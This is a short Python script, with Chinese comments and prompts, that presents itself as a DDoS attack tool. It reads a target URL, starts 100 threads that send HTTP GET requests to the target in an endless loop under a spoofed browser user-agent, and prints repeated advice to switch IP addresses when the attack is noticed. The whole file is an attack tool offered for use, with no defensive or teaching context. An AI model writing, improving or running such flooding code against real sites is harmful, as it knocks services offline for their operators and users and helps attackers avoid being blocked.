import threading
import requests

# 定义全局变量用于控制攻击是否停止
stop_attack = False

def attack(url):
    try:
        while not stop_attack:
            response = requests.get(url, headers={'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'})
            print('状态码:', response.status_code)
    except requests.exceptions.RequestException as e:
        print('访问失败:', e)
        print('请求异常:', e)

def main():
    global stop_attack
    url = input('要攻击的网址:')
    input('按 Enter 停止攻击...')

    # 创建多个线程进行攻击
    num_threads = 100  # 控制线程数量
    threads = []
    
    for _ in range(num_threads):
        t = threading.Thread(target=attack, args=(url,))
        t.start()
        threads.append(t)
    
    # 等待用户按 Enter 停止攻击
    input('攻击已经开始，按 Enter 停止攻击...')
    stop_attack = True
    
    for t in threads:
        t.join()

if '__main__' == __name__:
    print('欢迎使用DDOS攻击工具')
    print('使用前要检查站状态，如涉及到过大量访问，及时替换IP')
    print('使用前要检查站状态，如涉及到过大量访问，及时替换IP')
    print('使用前要检查站状态，如涉及到过大量访问，及时替换IP')
    print('使用前要检查站状态，如涉及到过大量访问，及时替换IP')
    main()
